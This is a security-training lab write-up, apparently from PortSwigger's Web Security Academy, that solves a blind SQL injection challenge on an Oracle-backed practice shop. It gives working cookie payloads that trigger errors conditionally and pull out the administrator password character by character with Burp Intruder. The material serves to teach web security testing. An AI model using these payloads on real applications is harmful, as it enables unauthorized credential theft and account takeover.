# Lab: Blind SQL injection with conditional errors

### PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

```
Hint
```
This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet][https://portswigger.net/web-security/sql-injection/cheat-sheet].

### Solution

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie. For simplicity, let's say the original value of the cookie is <code>TrackingId=xyz</code>.

2. Modify the <code>TrackingId</code> cookie, appending a single quotation mark to it: <code>TrackingId=xyz'</code>. Verify that an error message is received.

3. Now change it to two quotation marks: <code>TrackingId=xyz''</code>. Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.

4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: <code>TrackingId=xyz'||(SELECT '')||'</code>. In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query: <code>TrackingId=xyz'||(SELECT '' FROM dual)||'</code>. As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all <code>SELECT</code> statements to explicitly specify a table name.

5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name: <code>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</code>. This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the <code>users</code> table exists, send the following query: <code>TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code>. As this query does not return an error, you can infer that this table does exist. Note that the <code>WHERE ROWNUM = 1</code> condition is important here to prevent the query from returning more than one row, which would break our concatenation.

7. You can also exploit this behavior to test conditions. First, submit the following query: <code>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>. Verify that an error message is received.

8. Now change it to: <code>TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>. Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The <code>CASE</code> statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions <code>1=1</code> and <code>1=2</code>, and an error is received when the condition is <code>true</code>.

9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username <code>administrator</code> exists: <code>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>. Verify that the condition is true (the error is received), confirming that there is a user called <code>administrator</code>.

10. The next step is to determine how many characters are in the password of the <code>administrator</code> user. To do this, change the value to: <code>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>. This condition should be true, confirming that the password is greater than 1 character in length.

11. Send a series of follow-up values to test different password lengths. Send: <code>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>. Then send: <code>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>. And so on. You can do this manually using <a href="/burp/documentation/desktop/tools/repeater">Burp Repeater</a>, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.

12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use <a href="/burp/documentation/desktop/tools/intruder">Burp Intruder</a>. Send the request you are working on to Burp Intruder, using the context menu.

13. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.

14. In the Positions tab, change the value of the cookie to: <code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>. This uses the <code>SUBSTR()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

15. Place payload position markers around the final <code>a</code> character in the cookie value. To do this, select just the <code>a</code>, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers): <code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>

16. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

17. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

18. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.

19. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value: <code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>

20. Launch the modified attack, review the results, and note the character at the second offset.

21. Continue this process testing offset 3, 4, and so on, until you have the whole password.

22. In your browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
